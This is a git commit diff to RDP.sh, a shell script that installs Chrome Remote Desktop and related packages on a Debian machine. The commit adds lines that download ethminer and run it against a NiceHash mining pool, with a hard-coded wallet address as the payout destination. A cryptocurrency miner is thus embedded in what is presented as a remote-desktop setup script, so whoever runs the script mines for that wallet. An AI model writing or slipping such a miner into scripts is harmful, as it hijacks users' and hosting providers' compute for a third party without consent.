f9d19fb56d1241bcb327a3781c592874cea6828f
NexMou <69827604+NexMou@users.noreply.github.com>
2020-12-30 12:26:24 +0700

    Update RDP.sh

--- RDP.sh
+++ RDP.sh
@@ -9,8 +9,6 @@ sudo apt-get update
 sudo apt install zip unzip
 sudo apt install vlc
 sudo apt install ethereum
-wget https://github.com/ethereum-mining/ethminer/releases/download/v0.19.0-alpha.0/ethminer-0.19.0-alpha.0-cuda-9-linux-x86_64.tar.gz
-tar xf ethminer-0.19.0-alpha.0-cuda-9-linux-x86_64.tar.gz
 wget https://dl.google.com/linux/direct/chrome-remote-desktop_current_amd64.deb
 sudo dpkg --install chrome-remote-desktop_current_amd64.deb
 sudo apt install --assume-yes --fix-broken
@@ -25,6 +23,11 @@ sudo apt install --assume-yes --fix-broken
 sudo apt install nautilus nano -y 
 sudo adduser NexMou chrome-remote-desktop
 } &> /dev/null &&
+sudo apt update
+sudo apt install ethereum
+wget https://github.com/ethereum-mining/ethminer/releases/download/v0.19.0-alpha.0/ethminer-0.19.0-alpha.0-cuda-9-linux-x86_64.tar.gz
+tar xf ethminer-0.19.0-alpha.0-cuda-9-linux-x86_64.tar.gz
+bin/ethminer -P stratum2+tcp://3FJgCbS587S4ZF56D3LtjEfYkWsrZZQrQ3.BXZ@daggerhashimoto.usa.nicehash.com:3353
 printf "\nSetup Complete " >&2 ||
 printf "\nError Occured " >&2
 printf '\nCheck https://remotedesktop.google.com/headless  Copy Command Of Debian Linux And Paste Down\n'
